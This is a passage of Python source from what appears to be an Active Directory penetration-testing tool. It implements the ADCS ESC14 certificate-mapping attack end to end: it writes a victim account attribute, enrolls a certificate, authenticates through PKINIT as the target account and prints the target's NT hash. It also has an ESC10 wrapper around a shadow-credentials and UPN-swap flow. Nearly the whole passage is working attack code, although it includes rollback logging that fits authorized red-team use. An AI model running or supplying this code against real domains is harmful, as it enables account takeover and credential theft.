    computer_deleted = False
    attribute_restored = False
    # Set after PKINIT succeeds: the impersonated target's ccache, one of the
    # credentials the delete cascade may authenticate as (see
    # :func:`_delete_ldap_candidates`).
    elevated_delete_ccache: Optional[str] = None

    async with esc_rollback_scope() as rb:

        async def _delete_victim() -> None:
            nonlocal computer_deleted
            if computer_deleted:
                return
            print_info(f"ESC14: deleting victim machine account {victim_name}...")
            if await _delete_machine_account_with_cascade(
                config,
                computer_name=victim_name,
                computer_dn=victim_dn,
                change_id=comp_change_id,
                elevated_ccache=elevated_delete_ccache,
            ):
                computer_deleted = True

        rb.add(_delete_victim)

        # Snapshot the victim attribute BEFORE the write (fresh computer: usually
        # absent) so it is restored exactly, then register the reversible change.
        def _snapshot() -> Optional[str]:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _read_attribute(conn, victim_dn, attribute)

        original_value = await asyncio.to_thread(_snapshot)

        attr_change_id = register_ldap_change(
            config.shell,
            kind="victim_attribute_written",
            domain=config.domain,
            target=victim_name,
            detail={
                "victim_dn": victim_dn,
                "attribute": attribute,
                "original_value": original_value,
                "written_value": match_value,
                "variant": variant,
            },
            method=f"ADCSESC14 variant {variant} — victim {attribute} write",
        )

        async def _restore_attr() -> None:
            nonlocal attribute_restored
            if attribute_restored:
                return
            print_info(
                f"ESC14: restoring {attribute} on victim {victim_name} to its "
                "original value..."
            )

            def _do_restore() -> bool:
                with ADscanLDAPConnection(ldap_cfg) as conn:
                    return _restore_attribute(
                        conn, victim_dn, attribute, original_value
                    )

            ok = await asyncio.to_thread(_do_restore)
            if ok:
                attribute_restored = True
                mark_reverted(config.shell, attr_change_id)
                print_success(f"ESC14: victim {attribute} restored.")
            else:
                mark_revert_failed(
                    config.shell,
                    attr_change_id,
                    error="LDAP modify failed",
                    instructions=(
                        f"Manually restore {attribute} on {victim_dn} to "
                        f"{original_value!r} (or delete it)"
                    ),
                )
                print_error(f"ESC14: failed to restore victim {attribute}.")

        rb.add(_restore_attr)

        # Write the match value so the victim's enrolled certificate carries the
        # identifier the target's weak mapping matches.
        print_info(
            f"ESC14 variant {variant}: setting victim {attribute} to satisfy the "
            "target's weak certificate mapping..."
        )

        def _write_attr() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _replace_attribute(conn, victim_dn, attribute, match_value)

        if not await asyncio.to_thread(_write_attr):
            raise RuntimeError(
                f"Failed to set {attribute} on victim {victim_dn}"
            )

        # Enroll a certificate as the victim; the DC maps it to the target.
        # Variants B/C/D are defined by the target's PRE-EXISTING weak explicit
        # mapping, matched against the victim attribute we just wrote — the CA builds
        # that identifier into the issued certificate from the directory. A
        # requester-supplied SAN UPN would switch the KDC to the implicit UPN mapping
        # (ESC1-style) and the weak explicit mapping would never be consulted, which
        # under StrongCertificateBindingEnforcement=2 fails outright. It also needs
        # ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME on the template, which the ESC14 detector
        # does not require. So enroll with NO SAN UPN (same rule as variant A).
        print_info(f"ESC14: requesting certificate as victim {victim_name}...")
        _esc14_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=config.template or "User",
            username=victim_name,
            password=victim_password,
            ca_fqdn=config.ca_fqdn,
            upn="",
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique=(
                f"ADCSESC14 variant {variant}: certificate enrollment as the victim"
            ),
            **({} if _esc14_key_size is None else {"key_size": int(_esc14_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            raise RuntimeError(f"Certificate request failed: {req.error}")

        # Authenticate with the victim's certificate AS THE TARGET — the DC maps it
        # to the target via the target's weak altSecurityIdentities mapping.
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_account,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            raise RuntimeError(f"PKINIT failed: {auth.error}")

        elevated_delete_ccache = str(auth.ccache_path) if auth.ccache_path else None

        # Clean up — restore the victim attribute and delete the victim.
        await _restore_attr()
        await _delete_victim()

        print_success(f"ESC14 variant {variant}: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=14,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
            evidence={"esc14_variant": variant},
        )


async def run_esc10(config: EscConfig) -> EscResult:
    """ESC10: GenericWrite on target -> shadow creds -> NT hash -> UPN swap -> cert -> PKINIT.

    Identical flow to ESC9. The distinction is in the detection condition:
    ESC10 requires StrongCertificateBindingEnforcement=0 or CertificateMappingMethods=4
    on the DC — the exploitability check happens at detection time, not here.
    run_esc10 simply delegates to run_esc9 with esc=10 stamped on the result.
    """
    result = await run_esc9(config)
    # Re-stamp esc number so callers and UI show ESC10 correctly.
    return EscResult(
        success=result.success,
        esc=10,
        nt_hash=result.nt_hash,
        ccache_path=result.ccache_path,
        pfx_path=result.pfx_path,
        error=result.error,
        evidence=result.evidence if hasattr(result, "evidence") else {},
    )
